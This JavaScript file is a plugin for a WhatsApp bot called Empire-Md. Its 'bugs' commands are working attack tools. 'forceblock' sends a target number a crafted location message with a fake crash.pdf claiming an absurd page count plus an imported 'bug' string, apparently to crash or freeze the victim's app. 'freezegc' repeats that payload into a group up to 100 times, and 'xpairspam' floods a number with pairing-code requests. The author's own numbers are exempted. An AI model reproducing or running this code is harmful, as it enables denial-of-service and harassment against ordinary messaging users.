/**
 Copyright (C) 2026
 Licensed under the  GPL-3.0 License;
 You may not use this file except in compliance with the License.
 It is supplied in the hope that it may be useful.
 * @project_name : Empire-Md
 * @author : efeurhobobullish <https://github.com/efeurhobobullish>
 * @description : Empire-Md ,A Multi-functional whatsapp bot.
 * @version 0.0.2
 **/
const { cmd, commands } = require('../lib');
const config = require('../config');
const prefix = config.PREFIX;
const { bugUrl } = require('../lib/bugs/bugUrl.js');
const { bug } = require('../lib/bugs/bug.js');
const { exec } = require('child_process');
const { proto, generateWAMessageFromContent, downloadContentFromMessage, getContentType } = require('baileys-pro')
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const P = require('pino');

cmd({
    pattern: "forceblock",
    category: "bugs",
    desc: "Sends a hidden payload to a target number.",
    filename: __filename,
}, async (conn, mek, m, { q, reply, sender }) => {
    try {
        if (!q) return reply(`Use ${prefix}forceblock <number>\nExample: ${prefix}forceblock 2348130000000`);

        const target = q.replace(/[^0-9]/g, '');
        const targetNumber = target + "@s.whatsapp.net";

        await conn.sendMessage(targetNumber, {
                location: {
                    degreesLatitude: 'Telegram: @only_one_empire',
                    degreesLongitude: 'Telegram: @only_one_empire',
                    name: `Telegram: @only_one_empire`,
                    url: bugUrl,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        isLiveLocation: true,
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: sender,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                title: "crash",
                                pageCount: 100000000000000000000,
                                fileName: "crash.pdf",
                                contactVcard: true
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363274419284848@newsletter',
                            serverMessageId: 1,
                            newsletterName: " " + bug + bug
                        },
                        externalAdReply: {
                            title: ' Telegram: @only_one_empire ',
                            body: 'Telegram: @only_one_empire',
                            mediaType: 0,
                            thumbnail: m,
                            jpegThumbnail: m,
                            mediaUrl: `https://www.youtube.com/@dgxeon`,
                            sourceUrl: `https://www.youtube.com/@dgxeon`
                        }
                    }
                }
            }); 

        await conn.sendMessage(m.chat, {
            text: `forceblock sent to @${target} using forceblock ✅\nPause 2 minutes to avoid ban.`,
            mentions: [targetNumber]
        }, { quoted: m });

    } catch (err) {
        reply("Error: " + err.message);
    }
});

 

cmd({
    pattern: "freezegc",
    category: "bugs",
    desc: "Sends a hidden payload to a group JID multiple times.",
    filename: __filename,
}, async (conn, mek, m, { q, reply, sender }) => {
    try {
        if (!q || !q.includes("|")) {
            return reply(`Use ${prefix}freezegc <count>|<group_jid or invite_link>\nExample: ${prefix}freezegc 20|1203630xxxxx@g.us`);
        }

        let [countStr, groupInput] = q.split("|").map(a => a.trim());
        let count = parseInt(countStr);

        if (isNaN(count) || count <= 0 || count > 100) return reply("❌ Invalid count. Max allowed is 100.");

        let targetGroup;

        if (groupInput.includes("chat.whatsapp.com")) {
            const code = groupInput.split("chat.whatsapp.com/")[1];
            if (!code) return reply("❌ Invalid invite link.");
            const groupInfo = await conn.groupAcceptInvite(code);
            targetGroup = groupInfo;
        } else {
            targetGroup = groupInput.endsWith("@g.us") ? groupInput : `${groupInput}@g.us`;
        }

        for (let i = 0; i < count; i++) {
            await conn.sendMessage(targetGroup, {
                location: {
                    degreesLatitude: 'Telegram: @only_one_empire',
                    degreesLongitude: 'Telegram: @only_one_empire',
                    name: `Telegram: @only_one_empire`,
                    url: bugUrl,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        isLiveLocation: true,
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: sender,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                title: "crash",
                                pageCount: 100000000000000000000,
                                fileName: "crash.pdf",
                                contactVcard: true
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363274419284848@newsletter',
                            serverMessageId: 1,
                            newsletterName: " " + bug + bug
                        },
                        externalAdReply: {
                            title: ' Telegram: @only_one_empire ',
                            body: 'Telegram: @only_one_empire',
                            mediaType: 0,
                            thumbnail: m,
                            jpegThumbnail: m,
                            mediaUrl: `https://www.youtube.com/@dgxeon`,
                            only_one_empire: `https://www.youtube.com/@only_one_empire`
                        }
                    }
                }
            });

            await new Promise(res => setTimeout(res, 1000)); // 1s delay between sends
        }

        await conn.sendMessage(m.chat, {
            text: `✅ Sent payload ${count}x to: ${targetGroup}`,
        }, { quoted: m });

    } catch (err) {
        reply("❌ Error: " + err.message);
    }
});

cmd({
    pattern: "xpairspam",
    category: "bugs",
    desc: "Sends a hidden payload to a target number.",
    filename: __filename,
}, async (conn, mek, m, { q, reply, sender }) => {

    const replygcxeon = (teks) => {
        conn.sendMessage(m.chat, {
            text: teks,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "Empire_Md",
                    newsletterJid: "120363337275149306@newsletter",
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: "Test Bug",
                    body: "Empire_Md",
                    thumbnailUrl: "https://files.catbox.moe/b4ajju.jpg",
                    sourceUrl: "https://files.catbox.moe/b4ajju.jpg",
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: m });
    };

    try {
        if (!q) return reply(`Use Example: ${prefix}xpairspam 2348130000000`);
        let [peenis, pepekk = "200"] = q.split("|");
        const target = q.replace(/[^0-9]/g, '');

        // Block specific numbers
        if (
            target === "2349014277524" ||
            target === "2349152768261" ||
            target === "2348078582627" ||
            target === "2348144250768"
        ) {
            return;
        }

        // Check if number is on WhatsApp
        const contactInfo = await conn.onWhatsApp(target);
        if (contactInfo.length === 0) {
            return replygcxeon("The number is not registered on WhatsApp");
        }

        const {
            default: makeWaSocket,
            useMultiFileAuthState,
            fetchLatestBaileysVersion
        } = require('baileys-pro');

        const { state } = await useMultiFileAuthState('XSession');
        const { version } = await fetchLatestBaileysVersion();

        replygcxeon(`Success!`);

        const sucked = await makeWaSocket({
            auth: state,
            version,
            logger: P({ level: 'fatal' })
        });

        for (let i = 0; i < pepekk; i++) {
            await sleep(1500);
            let prc = await sucked.requestPairingCode(target);
            console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`);
        }

        await sleep(15000);

        await conn.sendMessage(m.chat, {
            text: `xpairspam sent to @${target} using xpairspam ✅\nPause 2 minutes to avoid ban.`,
            mentions: [target]
        }, { quoted: m });

    } catch (err) {
        reply("Error: " + err.message);
    }
});